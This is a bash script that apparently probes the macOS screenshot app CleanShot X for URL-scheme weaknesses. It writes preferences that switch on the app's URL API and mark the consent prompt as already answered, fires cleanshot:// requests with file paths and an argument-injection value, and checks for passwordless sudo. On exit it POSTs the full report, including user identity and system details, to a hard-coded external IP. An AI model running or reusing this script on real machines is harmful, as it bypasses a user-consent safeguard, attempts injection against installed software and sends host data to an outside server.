#!/bin/bash
# CleanShot X probe v8 — write defaults to the app's SUITE domain, prove URL delivery
OUT=/tmp/csx-report-v8.txt
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1
set -x
set +e

DROP_URL="http://143.246.43.43:8080/csx-v8"
DOMAIN="pl.maketheweb.cleanshotx"
SUITE="AFJU4P8ZV4.pl.maketheweb.cleanshotx"

finish() {
  echo "=== EXIT $? ==="
  curl -s --max-time 60 -X POST --data-binary @/tmp/csx-report-v8.txt "$DROP_URL" || true
}
trap finish EXIT

echo "=== ENV ==="
sw_vers; uname -m; id; sudo -n true 2>&1 && echo SUDO_OK || echo SUDO_NO

DMG=/tmp/csx.dmg
curl -sSL --max-time 300 -o "$DMG" https://updates.getcleanshot.com/v3/CleanShot-X-5.0.2.dmg
hdiutil attach "$DMG" -nobrowse -noverify -readonly
MP=$(hdiutil info | awk -F'\t' '/\/Volumes\//{print $NF}' | tail -1)
APP="$MP/CleanShot X.app"
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f "$APP" 2>&1
sleep 2

echo "=== DEFAULTS BEFORE (both domains) ==="
defaults read "$DOMAIN" 2>&1 | head -20
echo "--- suite:"
defaults read "$SUITE" 2>&1 | head -20

echo "=== WRITE BOTH DOMAINS ==="
for D in "$DOMAIN" "$SUITE"; do
  defaults write "$D" allowURLSchemesAPI -bool true
  defaults write "$D" didAskAboutURLSchemesAPI -bool true
  defaults write "$D" _allowURLSchemes -bool true
  echo "-- $D now:"
  defaults read "$D" 2>&1 | grep -iE "urlscheme"
done

echo "=== LAUNCH ==="
open -a "$APP"
sleep 12
PID=$(pgrep -f "CleanShot X.app/Contents/MacOS" | head -1)
echo "PID=$PID"

python3 - <<'PY'
import struct, zlib
def png(path,color,w=64,h=64):
    raw=b''.join(b'\x00'+bytes(color)*w for _ in range(h))
    def ch(t,d):
        c=t+d
        return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xffffffff)
    open(path,'wb').write(b'\x89PNG\r\n\x1a\n'+ch(b'IHDR',struct.pack('>IIBBBBB',w,h,8,2,0,0,0))+ch(b'IDAT',zlib.compress(raw))+ch(b'IEND',b''))
png('/tmp/csx_canary.png',(255,128,0))
PY
ls -l /tmp/csx_canary.png

echo "=== D1: capture-fullscreen (delivery proof) ==="
T=$(date -u '+%Y-%m-%d %H:%M:%S')
echo "T=$T"
open -g "cleanshot://capture-fullscreen"; echo "rc=$?"
sleep 6
log show --start "$T" --predicate 'process == "CleanShot X" OR eventMessage CONTAINS "kTCCServiceScreenCapture" OR subsystem == "com.apple.launchservices"' --style compact 2>/dev/null | grep -iE "screen|capture|cleanshot|url" | tail -25

echo "=== D2: open-settings ==="
T=$(date -u '+%Y-%m-%d %H:%M:%S'); echo "T=$T"
open -g "cleanshot://open-settings"; echo "rc=$?"
sleep 5
log show --start "$T" --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | tail -20

echo "=== D3: pin filepath ==="
T=$(date -u '+%Y-%m-%d %H:%M:%S'); echo "T=$T"
open -g "cleanshot://pin?filepath=/tmp/csx_canary.png"; echo "rc=$?"
for i in $(seq 1 10); do lsof -p "$PID" 2>/dev/null | grep -i csx_canary && echo "LSOF_HIT_$i"; sleep 1; done
log show --start "$T" --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | grep -iE "canary|pin|file|error|denied|fail" | tail -25

echo "=== D4: open-annotate filepath ==="
T=$(date -u '+%Y-%m-%d %H:%M:%S'); echo "T=$T"
open -g "cleanshot://open-annotate?filepath=/tmp/csx_canary.png"; echo "rc=$?"
for i in $(seq 1 6); do lsof -p "$PID" 2>/dev/null | grep -i csx_canary && echo "LSOF_ANN_$i"; sleep 1; done
log show --start "$T" --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | tail -20

echo "=== D5: fs_usage capture (if sudo) ==="
if sudo -n true 2>/dev/null; then
  timeout 12 sudo fs_usage -w -f filesys "$PID" > /tmp/fsusage.txt 2>&1 &
  FSPID=$!
  sleep 1
  open -g "cleanshot://open-annotate?filepath=/tmp/csx_canary.png"
  sleep 8
  wait $FSPID 2>/dev/null
  grep -iE "canary|cleanshot" /tmp/fsusage.txt | head -30
else
  echo "no sudo"
fi

echo "=== D6: argument injection candidate ==="
touch /tmp/CSX_ARGWINJ 2>/dev/null
open -g "cleanshot://pin?filepath=-o/tmp/CSX_ARGWINJ"; echo "rc=$?"
sleep 5
ls -l /tmp/CSX_ARGWINJ 2>&1

echo "=== E: app windows / state ==="
log show --last 3m --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | grep -icE "window|NSWindow" 
ls -la ~/Library/Application\ Support/ | grep -iE "cleanshot|maketheweb"
find ~/Library -maxdepth 5 -iname "*cleanshot*" -newermt '-10 minutes' 2>/dev/null | head -20

echo "=== DONE ==="
exit 0
